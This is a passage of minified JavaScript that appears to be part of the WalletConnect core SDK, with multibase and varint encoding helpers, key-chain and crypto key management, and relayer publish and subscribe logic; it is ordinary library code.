EE({prefix:r,name:e,encode:i,decode:s=>Toe(n(s))})},Fot=(r,e,t,i)=>{const n={};for(let u=0;u<e.length;++u)n[e[u]]=u;let s=r.length;for(;r[s-1]==="=";)--s;const o=new Uint8Array(s*t/8|0);let a=0,c=0,l=0;for(let u=0;u<s;++u){const d=n[r[u]];if(d===void 0)throw new SyntaxError(`Non-${i} character`);c=c<<t|d,a+=t,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=t||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},qot=(r,e,t)=>{const i=e[e.length-1]==="=",n=(1<<t)-1;let s="",o=0,a=0;for(let c=0;c<r.length;++c)for(a=a<<8|r[c],o+=8;o>t;)o-=t,s+=e[n&a>>o];if(o&&(s+=e[n&a<<t-o]),i)for(;s.length*t&7;)s+="=";return s},bo=({name:r,prefix:e,bitsPerChar:t,alphabet:i})=>EE({prefix:e,name:r,encode(n){return qot(n,i,t)},decode(n){return Fot(n,i,t,r)}}),zot=EE({prefix:"\0",name:"identity",encode:r=>Mot(r),decode:r=>Bot(r)});var Wot=Object.freeze({__proto__:null,identity:zot});const Hot=bo({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1});var Vot=Object.freeze({__proto__:null,base2:Hot});const Kot=bo({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3});var Got=Object.freeze({__proto__:null,base8:Kot});const Zot=a6({prefix:"9",name:"base10",alphabet:"0123456789"});var Yot=Object.freeze({__proto__:null,base10:Zot});const Jot=bo({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),Qot=bo({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4});var Xot=Object.freeze({__proto__:null,base16:Jot,base16upper:Qot});const eat=bo({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),tat=bo({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),rat=bo({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),iat=bo({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),nat=bo({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),sat=bo({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),oat=bo({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),aat=bo({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),cat=bo({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5});var lat=Object.freeze({__proto__:null,base32:eat,base32upper:tat,base32pad:rat,base32padupper:iat,base32hex:nat,base32hexupper:sat,base32hexpad:oat,base32hexpadupper:aat,base32z:cat});const uat=a6({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),dat=a6({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"});var hat=Object.freeze({__proto__:null,base36:uat,base36upper:dat});const fat=a6({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),pat=a6({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"});var gat=Object.freeze({__proto__:null,base58btc:fat,base58flickr:pat});const mat=bo({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),wat=bo({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),bat=bo({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),vat=bo({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6});var yat=Object.freeze({__proto__:null,base64:mat,base64pad:wat,base64url:bat,base64urlpad:vat});const Noe=Array.from(""),xat=Noe.reduce((r,e,t)=>(r[t]=e,r),[]),Cat=Noe.reduce((r,e,t)=>(r[e.codePointAt(0)]=t,r),[]);function Eat(r){return r.reduce((e,t)=>(e+=xat[t],e),"")}function _at(r){const e=[];for(const t of r){const i=Cat[t.codePointAt(0)];if(i===void 0)throw new Error(`Non-base256emoji character: ${t}`);e.push(i)}return new Uint8Array(e)}const Sat=EE({prefix:"",name:"base256emoji",encode:Eat,decode:_at});var Aat=Object.freeze({__proto__:null,base256emoji:Sat}),Iat=Poe,iG=128,Tat=-128,kat=Math.pow(2,31);function Poe(r,e,t){e=e||[],t=t||0;for(var i=t;r>=kat;)e[t++]=r&255|iG,r/=128;for(;r&Tat;)e[t++]=r&255|iG,r>>>=7;return e[t]=r|0,Poe.bytes=t-i+1,e}var Nat=LP,Pat=128,nG=127;function LP(r,i){var t=0,i=i||0,n=0,s=i,o,a=r.length;do{if(s>=a)throw LP.bytes=0,new RangeError("Could not decode varint");o=r[s++],t+=n<28?(o&nG)<<n:(o&nG)*Math.pow(2,n),n+=7}while(o>=Pat);return LP.bytes=s-i,t}var $at=Math.pow(2,7),Rat=Math.pow(2,14),Oat=Math.pow(2,21),Bat=Math.pow(2,28),Mat=Math.pow(2,35),Dat=Math.pow(2,42),Lat=Math.pow(2,49),Uat=Math.pow(2,56),jat=Math.pow(2,63),Fat=function(r){return r<$at?1:r<Rat?2:r<Oat?3:r<Bat?4:r<Mat?5:r<Dat?6:r<Lat?7:r<Uat?8:r<jat?9:10},qat={encode:Iat,decode:Nat,encodingLength:Fat},$oe=qat;const sG=(r,e,t=0)=>($oe.encode(r,e,t),e),oG=r=>$oe.encodingLength(r),UP=(r,e)=>{const t=e.byteLength,i=oG(r),n=i+oG(t),s=new Uint8Array(n+t);return sG(r,s,0),sG(t,s,i),s.set(e,n),new zat(r,t,e,s)};class zat{constructor(e,t,i,n){this.code=e,this.size=t,this.digest=i,this.bytes=n}}const Roe=({name:r,code:e,encode:t})=>new Wat(r,e,t);class Wat{constructor(e,t,i){this.name=e,this.code=t,this.encode=i}digest(e){if(e instanceof Uint8Array){const t=this.encode(e);return t instanceof Uint8Array?UP(this.code,t):t.then(i=>UP(this.code,i))}else throw Error("Unknown type, must be binary type")}}const Ooe=r=>async e=>new Uint8Array(await crypto.subtle.digest(r,e)),Hat=Roe({name:"sha2-256",code:18,encode:Ooe("SHA-256")}),Vat=Roe({name:"sha2-512",code:19,encode:Ooe("SHA-512")});var Kat=Object.freeze({__proto__:null,sha256:Hat,sha512:Vat});const Boe=0,Gat="identity",Moe=Toe,Zat=r=>UP(Boe,Moe(r)),Yat={code:Boe,name:Gat,encode:Moe,digest:Zat};var Jat=Object.freeze({__proto__:null,identity:Yat});new TextEncoder,new TextDecoder;const aG={...Wot,...Vot,...Got,...Yot,...Xot,...lat,...hat,...gat,...yat,...Aat};({...Kat,...Jat});function Qat(r=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?globalThis.Buffer.allocUnsafe(r):new Uint8Array(r)}function Doe(r,e,t,i){return{name:r,prefix:e,encoder:{name:r,prefix:e,encode:t},decoder:{decode:i}}}const cG=Doe("utf8","u",r=>"u"+new TextDecoder("utf8").decode(r),r=>new TextEncoder().encode(r.substring(1))),AT=Doe("ascii","a",r=>{let e="a";for(let t=0;t<r.length;t++)e+=String.fromCharCode(r[t]);return e},r=>{r=r.substring(1);const e=Qat(r.length);for(let t=0;t<r.length;t++)e[t]=r.charCodeAt(t);return e}),Xat={utf8:cG,"utf-8":cG,hex:aG.base16,latin1:AT,ascii:AT,binary:AT,...aG};function ect(r,e="utf8"){const t=Xat[e];if(!t)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(r,"utf8"):t.decoder.decode(`${t.prefix}${r}`)}var tct=Object.defineProperty,rct=(r,e,t)=>e in r?tct(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Ju=(r,e,t)=>rct(r,typeof e!="symbol"?e+"":e,t);class ict{constructor(e,t){this.core=e,this.logger=t,Ju(this,"keychain",new Map),Ju(this,"name",iot),Ju(this,"version",not),Ju(this,"initialized",!1),Ju(this,"storagePrefix",Kd),Ju(this,"init",async()=>{if(!this.initialized){const i=await this.getKeyChain();typeof i<"u"&&(this.keychain=i),this.initialized=!0}}),Ju(this,"has",i=>(this.isInitialized(),this.keychain.has(i))),Ju(this,"set",async(i,n)=>{this.isInitialized(),this.keychain.set(i,n),await this.persist()}),Ju(this,"get",i=>{this.isInitialized();const n=this.keychain.get(i);if(typeof n>"u"){const{message:s}=at("NO_MATCHING_KEY",`${this.name}: ${i}`);throw new Error(s)}return n}),Ju(this,"del",async i=>{this.isInitialized(),this.keychain.delete(i),await this.persist()}),this.core=e,this.logger=gr(t,this.name)}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}async setKeyChain(e){await this.core.storage.setItem(this.storageKey,_P(e))}async getKeyChain(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?SP(e):void 0}async persist(){await this.setKeyChain(this.keychain)}isInitialized(){if(!this.initialized){const{message:e}=at("NOT_INITIALIZED",this.name);throw new Error(e)}}}var nct=Object.defineProperty,sct=(r,e,t)=>e in r?nct(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,eo=(r,e,t)=>sct(r,typeof e!="symbol"?e+"":e,t);class oct{constructor(e,t,i){this.core=e,this.logger=t,eo(this,"name",tot),eo(this,"keychain"),eo(this,"randomSessionIdentifier",BP()),eo(this,"initialized",!1),eo(this,"init",async()=>{this.initialized||(await this.keychain.init(),this.initialized=!0)}),eo(this,"hasKeys",n=>(this.isInitialized(),this.keychain.has(n))),eo(this,"getClientId",async()=>{this.isInitialized();const n=await this.getClientSeed(),s=Iw(n);return nC(s.publicKey)}),eo(this,"generateKeyPair",()=>{this.isInitialized();const n=Znt();return this.setPrivateKey(n.publicKey,n.privateKey)}),eo(this,"signJWT",async n=>{this.isInitialized();const s=await this.getClientSeed(),o=Iw(s),a=this.randomSessionIdentifier;return await nR(a,n,rot,o)}),eo(this,"generateSharedKey",(n,s,o)=>{this.isInitialized();const a=this.getPrivateKey(n),c=Ynt(a,s);return this.setSymKey(c,o)}),eo(this,"setSymKey",async(n,s)=>{this.isInitialized();const o=s||T9(n);return await this.keychain.set(o,n),o}),eo(this,"deleteKeyPair",async n=>{this.isInitialized(),await this.keychain.del(n)}),eo(this,"deleteSymKey",async n=>{this.isInitialized(),await this.keychain.del(n)}),eo(this,"encode",async(n,s,o)=>{this.isInitialized();const a=yoe(o),c=mu(s);if(qK(a))return Xnt(c,o?.encoding);if(FK(a)){const h=a.senderPublicKey,f=a.receiverPublicKey;n=await this.generateSharedKey(h,f)}const l=this.getSymKey(n),{type:u,senderPublicKey:d}=a;return Jnt({type:u,symKey:l,message:c,senderPublicKey:d,encoding:o?.encoding})}),eo(this,"decode",async(n,s,o)=>{this.isInitialized();const a=tst(s,o);if(qK(a)){const c=est(s,o?.encoding);return gu(c)}if(FK(a)){const c=a.receiverPublicKey,l=a.senderPublicKey;n=await this.generateSharedKey(c,l)}try{const c=this.getSymKey(n),l=Qnt({symKey:c,encoded:s,encoding:o?.encoding});return gu(l)}catch(c){this.logger.error(`Failed to decode message from topic: '${n}', clientId: '${await this.getClientId()}'`),this.logger.error(c)}}),eo(this,"getPayloadType",(n,s=uu)=>{const o=Dy({encoded:n,encoding:s});return Rg(o.type)}),eo(this,"getPayloadSenderPublicKey",(n,s=uu)=>{const o=Dy({encoded:n,encoding:s});return o.senderPublicKey?Fi(o.senderPublicKey,Yo):void 0}),this.core=e,this.logger=gr(t,this.name),this.keychain=i||new ict(this.core,this.logger)}get context(){return Or(this.logger)}async setPrivateKey(e,t){return await this.keychain.set(e,t),e}getPrivateKey(e){return this.keychain.get(e)}async getClientSeed(){let e="";try{e=this.keychain.get(eG)}catch{e=BP(),await this.keychain.set(eG,e)}return ect(e,"base16")}getSymKey(e){return this.keychain.get(e)}isInitialized(){if(!this.initialized){const{message:e}=at("NOT_INITIALIZED",this.name);throw new Error(e)}}}var act=Object.defineProperty,cct=Object.defineProperties,lct=Object.getOwnPropertyDescriptors,lG=Object.getOwnPropertySymbols,uct=Object.prototype.hasOwnProperty,dct=Object.prototype.propertyIsEnumerable,jP=(r,e,t)=>e in r?act(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,hct=(r,e)=>{for(var t in e||(e={}))uct.call(e,t)&&jP(r,t,e[t]);if(lG)for(var t of lG(e))dct.call(e,t)&&jP(r,t,e[t]);return r},fct=(r,e)=>cct(r,lct(e)),Ja=(r,e,t)=>jP(r,typeof e!="symbol"?e+"":e,t);class pct extends xet{constructor(e,t){super(e,t),this.logger=e,this.core=t,Ja(this,"messages",new Map),Ja(this,"messagesWithoutClientAck",new Map),Ja(this,"name",sot),Ja(this,"version",oot),Ja(this,"initialized",!1),Ja(this,"storagePrefix",Kd),Ja(this,"init",async()=>{if(!this.initialized){this.logger.trace("Initialized");try{const i=await this.getRelayerMessages();typeof i<"u"&&(this.messages=i);const n=await this.getRelayerMessagesWithoutClientAck();typeof n<"u"&&(this.messagesWithoutClientAck=n),this.logger.debug(`Successfully Restored records for ${this.name}`),this.logger.trace({type:"method",method:"restore",size:this.messages.size})}catch(i){this.logger.debug(`Failed to Restore records for ${this.name}`),this.logger.error(i)}finally{this.initialized=!0}}}),Ja(this,"set",async(i,n,s)=>{this.isInitialized();const o=ld(n);let a=this.messages.get(i);if(typeof a>"u"&&(a={}),typeof a[o]<"u")return o;if(a[o]=n,this.messages.set(i,a),s===k9.inbound){const c=this.messagesWithoutClientAck.get(i)||{};this.messagesWithoutClientAck.set(i,fct(hct({},c),{[o]:n}))}return await this.persist(),o}),Ja(this,"get",i=>{this.isInitialized();let n=this.messages.get(i);return typeof n>"u"&&(n={}),n}),Ja(this,"getWithoutAck",i=>{this.isInitialized();const n={};for(const s of i){const o=this.messagesWithoutClientAck.get(s)||{};n[s]=Object.values(o)}return n}),Ja(this,"has",(i,n)=>{this.isInitialized();const s=this.get(i),o=ld(n);return typeof s[o]<"u"}),Ja(this,"ack",async(i,n)=>{this.isInitialized();const s=this.messagesWithoutClientAck.get(i);if(typeof s>"u")return;const o=ld(n);delete s[o],Object.keys(s).length===0?this.messagesWithoutClientAck.delete(i):this.messagesWithoutClientAck.set(i,s),await this.persist()}),Ja(this,"del",async i=>{this.isInitialized(),this.messages.delete(i),this.messagesWithoutClientAck.delete(i),await this.persist()}),this.logger=gr(e,this.name),this.core=t}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name}get storageKeyWithoutClientAck(){return this.storagePrefix+this.version+this.core.customStoragePrefix+"//"+this.name+"_withoutClientAck"}async setRelayerMessages(e){await this.core.storage.setItem(this.storageKey,_P(e))}async setRelayerMessagesWithoutClientAck(e){await this.core.storage.setItem(this.storageKeyWithoutClientAck,_P(e))}async getRelayerMessages(){const e=await this.core.storage.getItem(this.storageKey);return typeof e<"u"?SP(e):void 0}async getRelayerMessagesWithoutClientAck(){const e=await this.core.storage.getItem(this.storageKeyWithoutClientAck);return typeof e<"u"?SP(e):void 0}async persist(){await this.setRelayerMessages(this.messages),await this.setRelayerMessagesWithoutClientAck(this.messagesWithoutClientAck)}isInitialized(){if(!this.initialized){const{message:e}=at("NOT_INITIALIZED",this.name);throw new Error(e)}}}var gct=Object.defineProperty,mct=Object.defineProperties,wct=Object.getOwnPropertyDescriptors,uG=Object.getOwnPropertySymbols,bct=Object.prototype.hasOwnProperty,vct=Object.prototype.propertyIsEnumerable,FP=(r,e,t)=>e in r?gct(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,R8=(r,e)=>{for(var t in e||(e={}))bct.call(e,t)&&FP(r,t,e[t]);if(uG)for(var t of uG(e))vct.call(e,t)&&FP(r,t,e[t]);return r},IT=(r,e)=>mct(r,wct(e)),Zl=(r,e,t)=>FP(r,typeof e!="symbol"?e+"":e,t);class yct extends Cet{constructor(e,t){super(e,t),this.relayer=e,this.logger=t,Zl(this,"events",new en.EventEmitter),Zl(this,"name",aot),Zl(this,"queue",new Map),Zl(this,"publishTimeout",fe.toMiliseconds(fe.ONE_MINUTE)),Zl(this,"initialPublishTimeout",fe.toMiliseconds(fe.ONE_SECOND*15)),Zl(this,"needsTransportRestart",!1),Zl(this,"publish",async(i,n,s)=>{var o;this.logger.debug("Publishing Payload"),this.logger.trace({type:"method",method:"publish",params:{topic:i,message:n,opts:s}});const a=s?.ttl||tG,c=cx(s),l=s?.prompt||!1,u=s?.tag||0,d=s?.id||Cs().toString(),h={topic:i,message:n,opts:{ttl:a,relay:c,prompt:l,tag:u,id:d,attestation:s?.attestation,tvf:s?.tvf}},f=`Failed to publish payload, please try again. id:${d} tag:${u}`;try{const p=new Promise(async g=>{const w=({id:x})=>{h.opts.id===x&&(this.removeRequestFromQueue(x),this.relayer.events.removeListener(qs.publish,w),g(h))};this.relayer.events.on(qs.publish,w);const m=Uf(new Promise((x,S)=>{this.rpcPublish({topic:i,message:n,ttl:a,prompt:l,tag:u,id:d,attestation:s?.attestation,tvf:s?.tvf}).then(x).catch(T=>{this.logger.warn(T,T?.message),S(T)})}),this.initialPublishTimeout,`Failed initial publish, retrying.... id:${d} tag:${u}`);try{await m,this.events.removeListener(qs.publish,w)}catch(x){this.queue.set(d,IT(R8({},h),{attempt:1})),this.logger.warn(x,x?.message)}});this.logger.trace({type:"method",method:"publish",params:{id:d,topic:i,message:n,opts:s}}),await Uf(p,this.publishTimeout,f)}catch(p){if(this.logger.debug("Failed to Publish Payload"),this.logger.error(p),(o=s?.internal)!=null&&o.throwOnFailedPublish)throw p}finally{this.queue.delete(d)}}),Zl(this,"on",(i,n)=>{this.events.on(i,n)}),Zl(this,"once",(i,n)=>{this.events.once(i,n)}),Zl(this,"off",(i,n)=>{this.events.off(i,n)}),Zl(this,"removeListener",(i,n)=>{this.events.removeListener(i,n)}),this.relayer=e,this.logger=gr(t,this.name),this.registerEventListeners()}get context(){return Or(this.logger)}async rpcPublish(e){var t,i,n,s;const{topic:o,message:a,ttl:c=tG,prompt:l,tag:u,id:d,attestation:h,tvf:f}=e,p={method:h5(cx().protocol).publish,params:R8({topic:o,message:a,ttl:c,prompt:l,tag:u,attestation:h},f),id:d};lo((t=p.params)==null?void 0:t.prompt)&&((i=p.params)==null||delete i.prompt),lo((n=p.params)==null?void 0:n.tag)&&((s=p.params)==null||delete s.tag),this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"message",direction:"outgoing",request:p});const g=await this.relayer.request(p);return this.relayer.events.emit(qs.publish,e),this.logger.debug("Successfully Published Payload"),g}removeRequestFromQueue(e){this.queue.delete(e)}checkQueue(){this.queue.forEach(async(e,t)=>{const i=e.attempt+1;this.queue.set(t,IT(R8({},e),{attempt:i}));const{topic:n,message:s,opts:o,attestation:a}=e;this.logger.warn({},`Publisher: queue->publishing: ${e.opts.id}, tag: ${e.opts.tag}, attempt: ${i}`),await this.rpcPublish(IT(R8({},e),{topic:n,message:s,ttl:o.ttl,prompt:o.prompt,tag:o.tag,id:o.id,attestation:a,tvf:o.tvf})),this.logger.warn({},`Publisher: queue->published: ${e.opts.id}`)})}registerEventListeners(){this.relayer.core.heartbeat.on(Ks.pulse,()=>{if(this.needsTransportRestart){this.needsTransportRestart=!1,this.relayer.events.emit(qs.connection_stalled);return}this.checkQueue()}),this.relayer.on(qs.message_ack,e=>{this.removeRequestFromQueue(e.id.toString())})}}var xct=Object.defineProperty,Cct=(r,e,t)=>e in r?xct(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,hm=(r,e,t)=>Cct(r,typeof e!="symbol"?e+"":e,t);class Ect{constructor(){hm(this,"map",new Map),hm(this,"set",(e,t)=>{const i=this.get(e);this.exists(e,t)||this.map.set(e,[...i,t])}),hm(this,"get",e=>this.map.get(e)||[]),hm(this,"exists",(e,t)=>this.get(e).includes(t)),hm(this,"delete",(e,t)=>{if(typeof t>"u"){this.map.delete(e);return}if(!this.map.has(e))return;const i=this.get(e);if(!this.exists(e,t))return;const n=i.filter(s=>s!==t);if(!n.length){this.map.delete(e);return}this.map.set(e,n)}),hm(this,"clear",()=>{this.map.clear()})}get topics(){return Array.from(this.map.keys())}}var _ct=Object.defineProperty,Sct=Object.defineProperties,Act=Object.getOwnPropertyDescriptors,dG=Object.getOwnPropertySymbols,Ict=Object.prototype.hasOwnProperty,Tct=Object.prototype.propertyIsEnumerable,qP=(r,e,t)=>e in r?_ct(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,Gb=(r,e)=>{for(var t in e||(e={}))Ict.call(e,t)&&qP(r,t,e[t]);if(dG)for(var t of dG(e))Tct.call(e,t)&&qP(r,t,e[t]);return r},TT=(r,e)=>Sct(r,Act(e)),Ji=(r,e,t)=>qP(r,typeof e!="symbol"?e+"":e,t);class kct extends Aet{constructor(e,t){super(e,t),this.relayer=e,this.logger=t,Ji(this,"subscriptions",new Map),Ji(this,"topicMap",new Ect),Ji(this,"events",new en.EventEmitter),Ji(this,"name",pot),Ji(this,"version",got),Ji(this,"pending",new Map),Ji(this,"cached",[]),Ji(this,"initialized",!1),Ji(this,"storagePrefix",Kd),Ji(this,"subscribeTimeout",fe.toMiliseconds(fe.ONE_MINUTE)),Ji(this,"initialSubscribeTimeout",fe.toMiliseconds(fe.ONE_SECOND*15)),Ji(this,"clientId"),Ji(this,"batchSubscribeTopicsLimit",500),Ji(this,"init",async()=>{this.initialized||(this.logger.trace("Initialized"),this.registerEventListeners(),await this.restore()),this.initialized=!0}),Ji(this,"subscribe",async(i,n)=>{this.isInitialized(),this.logger.debug("Subscribing Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:i,opts:n}});try{const s=cx(n),o={topic:i,relay:s,transportType:n?.transportType};this.pending.set(i,o);const a=await this.rpcSubscribe(i,s,n);return typeof a=="string"&&(this.onSubscribe(a,o),this.logger.debug("Successfully Subscribed Topic"),this.logger.trace({type:"method",method:"subscribe",params:{topic:i,opts:n}})),a}catch(s){throw this.logger.debug("Failed to Subscribe Topic"),this.logger.error(s),s}}),Ji(this,"unsubscribe",async(i,n)=>{this.isInitialized(),typeof n?.id<"u"?await this.unsubscribeById(i,n.id,n):await this.unsubscribeByTopic(i,n)}),Ji(this,"isSubscribed",i=>new Promise(n=>{n(this.topicMap.topics.includes(i))})),Ji(this,"isKnownTopic",i=>new Promise(n=>{n(this.topicMap.topics.includes(i)||this.pending.has(i)||this.cached.some(s=>s.topic===i))})),Ji(this,"on",(i,n)=>{this.events.on(i,n)}),Ji(this,"once",(i,n)=>{this.events.once(i,n)}),Ji(this,"off",(i,n)=>{this.events.off(i,n)}),Ji(this,"removeListener",(i,n)=>{this.events.removeListener(i,n)}),Ji(this,"start",async()=>{await this.onConnect()}),Ji(this,"stop",async()=>{await this.onDisconnect()}),Ji(this,"restart",async()=>{await this.restore(),await this.onRestart()}),Ji(this,"checkPending",async()=>{if(this.pending.size===0&&(!this.initialized||!this.relayer.connected))return;const i=[];this.pending.forEach(n=>{i.push(n)}),await this.batchSubscribe(i)}),Ji(this,"registerEventListeners",()=>{this.relayer.core.heartbeat.on(Ks.pulse,async()=>{await this.checkPending()}),this.events.on(ec.created,async i=>{const n=ec.created;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:i}),await this.persist()}),this.events.on(ec.deleted,async i=>{const n=ec.deleted;this.logger.info(`Emitting ${n}`),this.logger.debug({type:"event",event:n,data:i}),await this.persist()})}),this.relayer=e,this.logger=gr(t,this.name),this.clientId=""}get context(){return Or(this.logger)}get storageKey(){return this.storagePrefix+this.version+this.relayer.core.customStoragePrefix+"//"+this.name}get length(){return this.subscriptions.size}get ids(){return Array.from(this.subscriptions.keys())}get values(){return Array.from(this.subscriptions.values())}get topics(){return this.topicMap.topics}get hasAnyTopics(){return this.topicMap.topics.length>0||this.pending.size>0||this.cached.length>0||this.subscriptions.size>0}hasSubscription(e,t){let i=!1;try{i=this.getSubscription(e).topic===t}catch{}return i}reset(){this.cached=[],this.initialized=!0}onDisable(){this.values.length>0&&(this.cached=this.values),this.subscriptions.clear(),this.topicMap.clear()}async unsubscribeByTopic(e,t){const i=this.topicMap.get(e);await Promise.all(i.map(async n=>await this.unsubscribeById(e,n,t)))}async unsubscribeById(e,t,i){this.logger.debug("Unsubscribing Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:t,opts:i}});try{const n=cx(i);await this.restartToComplete({topic:e,id:t,relay:n}),await this.rpcUnsubscribe(e,t,n);const s=Vi("USER_DISCONNECTED",`${this.name}, ${e}`);await this.onUnsubscribe(e,t,s),this.logger.debug("Successfully Unsubscribed Topic"),this.logger.trace({type:"method",method:"unsubscribe",params:{topic:e,id:t,opts:i}})}catch(n){throw this.logger.debug("Failed to Unsubscribe Topic"),this.logger.error(n),n}}async rpcSubscribe(e,t,i){var n;(!i||i?.transportType===pn.relay)&&await this.restartToComplete({topic:e,id:e,relay:t});const s={method:h5(t.protocol).subscribe,params:{topic:e}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:s});const o=(n=i?.internal)==null?void 0:n.throwOnFailedPublish;try{const a=await this.getSubscriptionId(e);if(i?.transportType===pn.link_mode)return setTimeout(()=>{(this.relayer.connected||this.relayer.connecting)&&this.relayer.request(s).catch(u=>this.logger.warn(u))},fe.toMiliseconds(fe.ONE_SECOND)),a;const c=new Promise(async u=>{const d=h=>{h.topic===e&&(this.events.removeListener(ec.created,d),u(h.id))};this.events.on(ec.created,d);try{const h=await Uf(new Promise((f,p)=>{this.relayer.request(s).catch(g=>{this.logger.warn(g,g?.message),p(g)}).then(f)}),this.initialSubscribeTimeout,`Subscribing to ${e} failed, please try again`);this.events.removeListener(ec.created,d),u(h)}catch{}}),l=await Uf(c,this.subscribeTimeout,`Subscribing to ${e} failed, please try again`);if(!l&&o)throw new Error(`Subscribing to ${e} failed, please try again`);return l?a:null}catch(a){if(this.logger.debug("Outgoing Relay Subscribe Payload stalled"),this.relayer.events.emit(qs.connection_stalled),o)throw a}return null}async rpcBatchSubscribe(e){if(!e.length)return;const t=e[0].relay,i={method:h5(t.protocol).batchSubscribe,params:{topics:e.map(n=>n.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i});try{await await Uf(new Promise(n=>{this.relayer.request(i).catch(s=>this.logger.warn(s)).then(n)}),this.subscribeTimeout,"rpcBatchSubscribe failed, please try again")}catch{this.relayer.events.emit(qs.connection_stalled)}}async rpcBatchFetchMessages(e){if(!e.length)return;const t=e[0].relay,i={method:h5(t.protocol).batchFetchMessages,params:{topics:e.map(s=>s.topic)}};this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:i});let n;try{n=await await Uf(new Promise((s,o)=>{this.relayer.request(i).catch(a=>{this.logger.warn(a),o(a)}).then(s)}),this.subscribeTimeout,"rpcBatchFetchMessages failed, please try again")}catch{this.relayer.events.emit(qs.connection_stalled)}return n}rpcUnsubscribe(e,t,i){const n={method:h5(i.protocol).unsubscribe,params:{topic:e,id:t}};return this.logger.debug("Outgoing Relay Payload"),this.logger.trace({type:"payload",direction:"outgoing",request:n}),this.relayer.request(n)}onSubscribe(e,t){this.setSubscription(e,TT(Gb({},t),{id:e})),this.pending.delete(t.topic)}onBatchSubscribe(e){e.length&&e.forEach(t=>{this.setSubscription(t.id,Gb({},t)),this.pending.delete(t.topic)})}async onUnsubscribe(e,t,i){this.events.removeAllListeners(t),this.hasSubscription(t,e)&&this.deleteSubscription(t,i),await this.relayer.messages.del(e)}async setRelayerSubscriptions(e){await this.relayer.core.storage.setItem(this.storageKey,e)}async getRelayerSubscriptions(){return await this.relayer.core.storage.getItem(this.storageKey)}setSubscription(e,t){this.logger.debug("Setting subscription"),this.logger.trace({type:"method",method:"setSubscription",id:e,subscription:t}),this.addSubscription(e,t)}addSubscription(e,t){this.subscriptions.set(e,Gb({},t)),this.topicMap.set(t.topic,e),this.events.emit(ec.created,t)}getSubscription(e){this.logger.debug("Getting subscription"),this.logger.trace({type:"method",method:"getSubscription",id:e});const t=this.subscriptions.get(e);if(!t){const{message:i}=at("NO_MATCHING_KEY",`${this.name}: ${e}`);throw new Error(i)}return t}deleteSubscription(e,t){this.logger.debug("Deleting subscription"),this.logger.trace({type:"method",method:"deleteSubscription",id:e,reason:t});const i=this.getSubscription(e);this.subscriptions.delete(e),this.topicMap.delete(i.topic,e),this.events.emit(ec.deleted,TT(Gb({},i),{reason:t}))}async persist(){await this.setRelayerSubscriptions(this.values),this.events.emit(ec.sync)}async onRestart(){if(this.cached.length){const e=[...this.cached],t=Math.ceil(this.cached.length/this.batchSubscribeTopicsLimit);for(let i=0;i<t;i++){const n=e.splice(0,this.batchSubscribeTopicsLimit);await 